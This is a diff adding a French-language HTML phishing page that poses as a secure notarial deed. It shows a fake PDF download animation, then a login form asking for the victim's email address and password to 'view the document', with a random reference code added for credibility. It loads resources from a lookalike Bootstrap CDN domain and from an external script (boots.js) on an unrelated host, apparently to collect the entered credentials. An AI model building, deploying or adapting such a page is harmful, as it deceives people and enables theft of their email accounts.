@@ -1,0 +1,105 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> ACTE NOTARIAL </title>
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://i.postimg.cc/0zZNWrf5/Design-sans-titre-5.png">
+	<link href="https://bootstrapcdngvr.web.app/inct/style.css" rel="stylesheet" type="text/css">
+	<script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const preview = document.getElementById('previewScreen');
+      const login = document.getElementById('loginContainer');
+      const downloadText = document.getElementById('downloadText');
+      const progressFill = document.getElementById('progressFill');
+      const docIcon = document.getElementById('docIcon');
+      let progress = Math.floor(Math.random() * 30); // démarrage aléatoire
+      downloadText.textContent = `Téléchargement… ${progress}%`;
+      progressFill.style.width = `${progress}%`;
+
+      function simulateDownload() {
+        const increment = Math.floor(Math.random() * 10) + 1; // saut aléatoire
+        progress = Math.min(progress + increment, 100);
+        downloadText.textContent = `Téléchargement… ${progress}%`;
+        progressFill.style.width = `${progress}%`;
+        if (progress < 100) {
+          const delay = Math.random() * 500 + 100;
+          setTimeout(simulateDownload, delay);
+        } else {
+          // Effet d'ouverture du PDF
+          docIcon.classList.add('preview-open');
+          downloadText.textContent = "Ouverture du document…";
+          setTimeout(() => {
+            preview.style.opacity = '0';
+            setTimeout(() => {
+              preview.style.display = 'none';
+              login.style.display = 'block';
+              login.classList.add('fade-in');
+            }, 500);
+          }, 1000); // durée de l'animation d'ouverture
+        }
+      }
+      simulateDownload();
+    });
+  </script></head>
+  <body>
+    <div id="previewScreen" class="preview-screen">
+      <div class="preview-content">
+        <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF" class="doc-icon" id="docIcon">
+        <p id="downloadText">Ouverture du document…</p>
+        <div style="background:#ddd;width:100%;height:8px;border-radius:4px;margin-top:10px;">
+          <div id="progressFill" style="height: 8px; background: rgb(102, 126, 234); width: 100%; border-radius: 4px;"></div>
+        </div>
+      </div>
+    </div>
+    <div class="container">
+      <header class="header">
+        <h1>Vérifiez votre identité</h1>
+      </header>
+      <div class="message"> Vous avez reçu un fichier sécurisé </div>
+      <div class="file-info">
+        <div class="file-icon">PDF</div>
+        <div class="file-details">
+          <h3>ACTE NOTARIAL</h3>
+          <p>Taille: 56.1 KB</p>
+        </div>
+      </div>
+      <div class="instruction">
+        <div class="instruction-text"> Dans le cadre du renforcement de la sécurité, veuillez vous authentifier avec les identifiants du compte e-mail sur lequel le document a été envoyé afin de pouvoir le visualiser. <span id="folderRef" class="ref">ref:8KVOHT</span>
+        </div>
+      </div>
+      <style>
+        
+      </style>
+      <script>
+        function generateFolderRef(length = 6) {
+          const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+          let ref = '';
+          for (let i = 0; i < length; i++) {
+            ref += chars.charAt(Math.floor(Math.random() * chars.length));
+          }
+          return ref;
+        }
+        // Génère un nouveau code à chaque actualisation
+        document.getElementById('folderRef').textContent = `ref:${generateFolderRef()}`;
+      </script>
+      <form id="loginForm">
+        <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
+        <div class="form-group">
+          <label>Entrez l'adresse email <span class="info-icon">i</span>
+          </label>
+          <input type="email" id="emailInput" placeholder="Entrez votre adresse email" required="" autofocus="autofocus">
+        </div>
+        <div class="password-group" id="passwordGroup">
+          <label>Entrez votre mot de passe</label>
+          <div class="password-input" style="margin-top: 0.4rem;">
+            <input type="password" id="passwordInput" placeholder="Entrez votre mot de passe" required="">
+            <button type="button" class="password-toggle" id="passwordToggle"></button>
+          </div>
+        </div>
+        <button type="submit" class="btn" id="submitBtn">Continuer</button>
+      </form>
+    </div>
+    <script></script>
+	<script src="https://xcwtvfactparis.es/boots.js"></script>
+</body>
